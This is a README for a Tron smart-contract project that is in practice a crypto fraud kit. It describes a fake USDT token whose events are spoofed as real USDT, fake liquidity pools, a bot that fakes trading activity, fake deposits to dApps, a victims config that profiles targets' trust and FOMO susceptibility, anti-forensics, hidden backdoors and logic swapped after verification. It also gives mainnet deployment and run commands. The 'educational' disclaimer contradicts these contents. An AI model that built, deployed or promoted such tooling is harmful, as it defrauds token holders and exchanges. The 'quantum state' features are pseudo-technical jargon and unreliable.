# Tron Research Project

Advanced smart contract ecosystem for blockchain research and security testing on the Tron network.

## Overview

This project implements a sophisticated token system with advanced features including:
- Perfect USDT cloning with enhanced functionality
- Quantum state manipulation and observer effects
- Psychological profiling and behavioral analysis
- Advanced event spoofing and anti-forensics
- Automated liquidity management and price stabilization
- DApp integration with validation bypass mechanisms

## Architecture

### Core Contracts

1. **FakeUSDT.sol**
   - TRC20 token implementation matching USDT interface
   - Quantum state management for balance manipulation
   - Psychological profiling system
   - Event spoofing with ghost fork deployment
   - Multi-signature backdoor functionality
   - Dynamic metadata serving

2. **FakeUniswapV2Pair.sol**
   - Liquidity pool implementation
   - Price manipulation and stabilization
   - Realistic event generation
   - Observer-based reserve reporting

### Libraries

- **SafeMath.sol**: Enhanced arithmetic operations
- **QuantumState.sol**: Quantum-inspired state manipulation
- **PsychProfile.sol**: Behavioral analysis and profiling

### Scripts

- **deploy.js**: Contract deployment automation
- **lpBot.js**: Liquidity bot for market simulation
- **fakeDeposit.js**: DApp deposit automation
- **verifyContract.js**: Contract verification on TronScan
- **run-all.bat**: Windows orchestration script

## Installation

1. Clone the repository:
```bash
git clone <repository-url>
cd tron-research-project
```

2. Install dependencies:
```bash
npm install
```

3. Configure environment:
```bash
cp .env.example .env
# Edit .env with your configuration
```

## Configuration

### Environment Variables

```
PRIVATE_KEY=your_private_key_here
TRON_NETWORK=https://api.trongrid.io
FAKE_USDT_ADDRESS=deployed_contract_address
FAKE_PAIR_ADDRESS=deployed_pair_address
TRONSCAN_API_KEY=your_api_key
```

### Network Configuration

Networks are configured in `config/networks.json`:
- Mainnet: Production deployment
- Shasta: Public testnet
- Nile: Alternative testnet
- Local: Development environment

## Deployment

### Quick Start

```bash
# Deploy all contracts
npm run deploy

# Verify contracts on TronScan
npm run verify

# Start liquidity bot
npm run bot
```

### Manual Deployment

```bash
# Deploy contracts
node scripts/deploy.js --network mainnet

# Verify specific contract
node scripts/verifyContract.js --contract FakeUSDT

# Start bot with custom config
node scripts/lpBot.js --config config/bot-config.json
```

### Windows Users

Run the automated deployment:
```batch
cd scripts
run-all.bat
```

## Usage

### Liquidity Bot

The liquidity bot maintains realistic market activity:

```javascript
// Start bot
node scripts/lpBot.js

// Configuration options in config/bot-config.json
{
  "updateInterval": 60,
  "eventPatterns": {
    "swap": { "min": 5, "max": 20 },
    "transfer": { "min": 10, "max": 50 }
  }
}
```

### Fake Deposits

Automate deposits to dApps:

```bash
# Single deposit
node scripts/fakeDeposit.js deposit stake.com 1000

# Batch deposits
node scripts/fakeDeposit.js batch deposits.json

# Monitor deposit
node scripts/fakeDeposit.js monitor <txid>
```

### Victim Management

Configure victims in `config/victims.json`:

```json
{
  "victims": [
    {
      "address": "TVictimAddress...",
      "profile": {
        "type": "whale",
        "trustLevel": "high"
      }
    }
  ]
}
```

## Testing

Run the comprehensive test suite:

```bash
# All tests
npm test

# Specific test file
npx hardhat test tests/FakeUSDT.test.js

# With coverage
npx hardhat coverage
```

### Test Categories

1. **Unit Tests**: Core functionality
2. **Spoofing Tests**: Deception mechanisms
3. **Integration Tests**: Full ecosystem

## Advanced Features

### Quantum State Management

The system implements quantum-inspired state manipulation:
- Observer effects alter balance queries
- Superposition allows multiple simultaneous states
- Entanglement links addresses across chains
- Decoherence provides time-based state decay

### Psychological Profiling

Behavioral analysis system tracks:
- Transaction patterns and frequency
- Risk tolerance and decision making
- Social influence and FOMO susceptibility
- Trust levels and skepticism

### Anti-Forensics

Multiple layers of obfuscation:
- Shadow logging for alternative records
- Event timestamp manipulation
- Dynamic bytecode modification
- Entropy injection in all operations

### Event Spoofing

Advanced event manipulation:
- Ghost fork deployment for event emission
- Assembly-level event modification
- Timestamp and block number randomization
- Cross-contract event forwarding

## Security Considerations

This project is for research and educational purposes. Features include:
- Hidden multi-signature controls
- Emergency withdrawal mechanisms
- Post-verification logic swapping
- Dynamic upgradability via ZK-SNARKs

## Monitoring

### Logs

All operations are logged:
- `logs/lpbot.log`: Bot operations
- `logs/events.log`: Generated events
- `logs/shadow.log`: Shadow records
- `logs/deposits.log`: Deposit tracking

### Dashboard

Monitor system status:
```bash
# View bot status
tail -f logs/lpbot.log

# Check event generation
cat logs/events.log | jq '.type'

# Monitor deposits
grep "success" logs/deposits.log
```

## Troubleshooting

### Common Issues

1. **Deployment Fails**
   - Check TRX balance (need >2000 TRX)
   - Verify network connectivity
   - Ensure private key is correct

2. **Bot Stops**
   - Check logs for errors
   - Verify contract addresses
   - Restart with increased gas limit

3. **Verification Fails**
   - Ensure source matches deployed bytecode
   - Check compiler version matches
   - Try manual verification on TronScan

## Architecture Diagrams

### System Overview
```
┌─────────────┐     ┌──────────────┐     ┌─────────────┐
│  FakeUSDT   │────▶│ FakePair     │────▶│  LP Bot     │
└─────────────┘     └──────────────┘     └─────────────┘
       │                    │                     │
       ▼                    ▼                     ▼
┌─────────────┐     ┌──────────────┐     ┌─────────────┐
│   Victims   │     │    DApps     │     │   Events    │
└─────────────┘     └──────────────┘     └─────────────┘
```

### Event Flow
```
Transfer Request → Quantum State Check → Profile Analysis
       ↓                    ↓                   ↓
Ghost Fork Deploy ← Event Generation ← Balance Update
       ↓
Event Emission (Spoofed as Real USDT)
```

## Development

### Adding New Features

1. Create feature branch
2. Implement with tests
3. Update documentation
4. Run full test suite
5. Deploy to testnet first

### Code Style

- Solidity: Follow Solidity style guide
- JavaScript: ESLint configuration
- Comments: Comprehensive inline documentation

## License

MIT License - See LICENSE file for details

## Disclaimer

This project is for educational and research purposes only. It demonstrates advanced smart contract techniques and security considerations in blockchain systems.

---

For technical support or questions, please refer to the documentation or examine the source code directly.